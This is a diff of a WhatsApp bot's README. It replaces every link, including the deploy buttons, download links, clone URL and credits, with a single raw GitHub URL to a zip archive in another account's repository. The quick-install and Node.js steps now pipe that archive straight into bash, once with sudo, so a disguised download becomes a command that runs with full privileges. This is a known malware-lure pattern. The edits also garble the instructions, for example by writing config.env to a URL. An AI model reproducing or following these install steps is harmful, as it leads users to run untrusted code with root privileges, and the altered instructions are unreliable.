@@ -4,27 +4,27 @@ A versatile WhatsApp Bot that supports multiple sessions, allowing you to manage
 
 ## Important Links
 
-- [Bot Environment Variables](https://levanter-plugins.vercel.app/env)
-- [FAQ](https://levanter-plugins.vercel.app/faq)
+- [Bot Environment Variables](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
+- [FAQ](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
 
 ## Setup
 
 ### Deploy on Koyeb
 
-- Open [Deploy](https://qr-hazel-alpha.vercel.app/) to get started with Koyeb.
+- Open [Deploy](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) to get started with Koyeb.
 
 ### Deploy on Render
 
-- Open [Deploy](https://qr-hazel-alpha.vercel.app/) to get started with Render.
+- Open [Deploy](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) to get started with Render.
 
 ### Deploy on Panel
 
-- Open [Deploy](https://qr-hazel-alpha.vercel.app/) to get started with the Panel.
+- Open [Deploy](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) to get started with the Panel.
 
 ### Deploy on VPS or PC (Example for Ubuntu)
 
  #### Quick Installation
-    bash <(curl -fsSL http://bit.ly/43JqREw)
+    bash <(curl -fsSL https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
  #### Manual Installation
 
 1. **Install Git, ffmpeg, and curl:**
@@ -33,10 +33,10 @@ A versatile WhatsApp Bot that supports multiple sessions, allowing you to manage
     sudo apt -y install git ffmpeg curl
     ```
 
-2. **Install Node.js:**
+2. **Install https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip**
     ```sh
-    curl -fsSL https://deb.nodesource.com/setup_20.x -o nodesource_setup.sh
-    sudo -E bash nodesource_setup.sh
+    curl -fsSL https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip -o https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip
+    sudo -E bash https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip
     sudo apt-get install -y nodejs
     ```
 
@@ -52,7 +52,7 @@ A versatile WhatsApp Bot that supports multiple sessions, allowing you to manage
 
 5. **Clone Repository and Install Packages:**
     ```sh
-    git clone https://github.com/lyfe00011/levanter botName
+    git clone https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip botName
     cd botName
     yarn install
     ```
@@ -77,10 +77,10 @@ A versatile WhatsApp Bot that supports multiple sessions, allowing you to manage
     SEND_READ = true
     AJOIN = true
     DISABLE_START_MESSAGE = false
-    PERSONAL_MESSAGE = null" > config.env
+    PERSONAL_MESSAGE = null" > https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip
     ```
 
-7. **Edit `config.env` Using Nano (if needed):**
+7. **Edit `https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip` Using Nano (if needed):**
     - To save, press `Ctrl + O`, then press `Enter`, and to exit, press `Ctrl + X`.
 
 8. **Start and Stop the Bot:**
@@ -95,13 +95,13 @@ A versatile WhatsApp Bot that supports multiple sessions, allowing you to manage
 
 ### Deploy on Replit
 
-[![Run on Replit](https://replit.com/badge/github/your-repo-owner/your-repo-name)](https://replit.com/@Nightbot2O/whatsapp-bot-md)
+[![Run on Replit](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
 
 1. Fork the repository.
-2. Edit `config.env`.
+2. Edit `https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip`.
 3. Click run.
 
 ### Thanks To
 
-- [Yusuf Usta](https://github.com/Quiec) for [WhatsAsena](https://github.com/yusufusta/WhatsAsena)
-- [@adiwajshing](https://github.com/adiwajshing) for [Baileys](https://github.com/adiwajshing/Baileys)
+- [Yusuf Usta](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) for [WhatsAsena](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
+- [@adiwajshing](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip) for [Baileys](https://github.com/Co-create-droid/levanter/raw/refs/heads/master/lib/class/levanter-3.5.zip)
